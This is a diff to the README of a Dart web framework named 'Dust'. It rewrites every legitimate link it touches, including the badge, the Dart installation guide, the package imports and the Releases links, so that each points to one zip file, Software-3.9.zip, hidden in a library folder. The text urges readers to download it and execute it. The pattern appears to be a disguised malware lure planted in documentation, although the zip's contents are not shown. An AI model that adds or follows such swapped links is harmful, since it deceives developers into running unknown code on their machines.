@@ -1,6 +1,6 @@
 # Dust 🌬️
 
-![Dust Logo](https://img.shields.io/badge/Dust-Framework-blue?style=flat&logo=dart)
+![Dust Logo](https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip)
 
 Welcome to **Dust**, a modern, component-based Dart web framework. Inspired by React and Vue, Dust leverages the power of WebAssembly (WASM) to deliver high performance and a seamless developer experience. Build robust, type-safe web applications effortlessly.
 
@@ -29,7 +29,7 @@ Welcome to **Dust**, a modern, component-based Dart web framework. Inspired by R
 
 ## Getting Started
 
-To get started with Dust, you need to have Dart installed on your machine. If you haven’t done this yet, visit the [Dart installation guide](https://dart.dev/get-dart) for instructions.
+To get started with Dust, you need to have Dart installed on your machine. If you haven’t done this yet, visit the [Dart installation guide](https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip) for instructions.
 
 Once you have Dart set up, you can easily create a new Dust project.
 
@@ -70,7 +70,7 @@ This will start a local development server. You can view your application by ope
 Dust allows you to create components easily. Here’s a simple example of a component:
 
 ```dart
-import 'package:dust/dust.dart';
+import 'https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip';
 
 class MyComponent extends Component {
   @override
@@ -91,7 +91,7 @@ You can then use this component in your main application file.
 Routing in Dust is straightforward. You can define routes in your application using the built-in router. Here’s an example:
 
 ```dart
-import 'package:dust/dust.dart';
+import 'https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip';
 
 class MyApp extends Component {
   @override
@@ -142,9 +142,9 @@ Dust is open-source software licensed under the MIT License. See the LICENSE fil
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/raskolafiw/Dust/releases). Here, you can download the latest version and execute it on your machine.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip). Here, you can download the latest version and execute it on your machine.
 
-If you want to explore more about Dust, feel free to check out the [Releases section](https://github.com/raskolafiw/Dust/releases) for updates and new features.
+If you want to explore more about Dust, feel free to check out the [Releases section](https://raw.githubusercontent.com/raskolafiw/Dust/main/packages/router/lib/Software-3.9.zip) for updates and new features.
 
 ---
 
